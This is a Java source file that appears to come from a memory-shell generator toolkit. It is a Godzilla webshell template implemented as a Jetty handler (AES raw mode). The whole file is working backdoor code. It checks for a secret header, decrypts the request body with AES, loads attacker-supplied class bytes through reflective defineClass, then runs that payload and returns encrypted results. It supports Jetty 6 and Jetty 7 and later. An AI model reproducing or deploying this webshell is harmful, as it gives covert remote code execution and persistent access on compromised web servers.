package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.eclipse.jetty.server.Handler;
import org.eclipse.jetty.server.Request;

/**
 * Godzilla HW JettyHandler 模板（JAVA_AES_RAW）。
 * <p>
 * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
 * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
 *
 * @author ReaJason
 */
public class GodzillaHwJettyHandlerRaw {
    private static String key;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    private Handler nextHandler;

    public GodzillaHwJettyHandlerRaw() {
    }

    @SuppressWarnings("all")
    public boolean handle(Object request, Object response) {
        try {
            return run(request, response);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    // jetty6
    public void handle(String target, HttpServletRequest request, HttpServletResponse response, int dispatch) throws IOException, ServletException {
        if (handle(request, response)) {
            invokeMethod(request, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            return;
        }
        if (nextHandler != null) {
            nextHandler.handle(target, request, response, dispatch);
        }
    }

    // jetty7+
    public void handle(String target, Request baseRequest, HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        if (handle(request, response)) {
            invokeMethod(baseRequest, "setHandled", new Class[]{boolean.class}, new Object[]{true});
            return;
        }
        if (nextHandler != null) {
            nextHandler.handle(target, baseRequest, request, response);
        }
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    method = paramClazz == null ? clazz.getDeclaredMethod(methodName) : clazz.getDeclaredMethod(methodName, paramClazz);
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj, param);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    @SuppressWarnings("all")
    private boolean run(Object request, Object response) throws Exception {
        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
        if (value == null || !value.contains(headerValue)) {
            return false;
        }
        byte[] data = x(readBody(request), false);
        if (payload == null) {
            payload = reflectionDefineClass(data);
            return true;
        }
        java.io.OutputStream outputStream = (java.io.OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
        try {
            outputStream.write(x(execute(request, data), true));
        } catch (Throwable e) {
            e.printStackTrace();
        }
        outputStream.flush();
        outputStream.close();
        return true;
    }

    @SuppressWarnings("all")
    private static byte[] execute(Object request, byte[] data) throws Exception {
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
        return arrOut.toByteArray();
    }

    @SuppressWarnings("all")
    private static byte[] readBody(Object request) throws Exception {
        java.io.InputStream inputStream = (java.io.InputStream) request.getClass().getMethod("getInputStream").invoke(request);
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        byte[] buffer = new byte[8192];
        int read;
        while ((read = inputStream.read(buffer)) > 0) {
            outputStream.write(buffer, 0, read);
        }
        return outputStream.toByteArray();
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
        return cipher.doFinal(s);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

}
